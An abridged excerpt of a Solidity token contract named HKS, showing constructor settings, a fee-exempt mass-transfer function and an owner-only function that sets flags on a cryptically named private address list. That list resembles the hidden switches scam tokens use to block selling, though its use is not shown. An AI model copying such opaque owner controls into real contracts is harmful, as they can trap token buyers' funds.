...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        burnUntilAmount = total - 210000 * 10 ** Decimals;
        _tTotal = total;
        swapAtAmount = 0;
    ...
    function setMainPair(address swapPair) public onlyOwner {
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;
    }
    ...
    mapping(address => bool) private tList;


    function setVL(address[] calldata tL, bool _j) public onlyOwner {
        for (uint i = 0; i < tL.length; i++) {
            tList[tL[i]] = _j;
        }
    }

    function massTransfer(address[] calldata _ad, uint _amount) public {
        require(_isExcludeFromFees[msg.sender], "bto");
        uint _num = _ad.length;
        _balances[msg.sender] -= _num * _amount;
        for (uint i = 0; i < _num; i++) {
            _balances[_ad[i]] += _amount;
            emit Transfer(msg.sender, _ad[i], _amount);
        }
    }
    ...
    address  public _removeLPFeeReceiver = address(0xdead);
    ...
    uint256 public holderCondition = 10 ** 18 / 10;
...
contract HKS is AbsToken {
    ...
    18,
    10 ** 9,
    address(0x2b2aDdd99115943276706391814153241618CC8E),
    address(0x5A5410390ab2595571F119B2C3e4312d9CC724B7),
    address(0x991747eE4b132733BCFdC614bde6F4d35F78EE0b)
    ){
    }
}
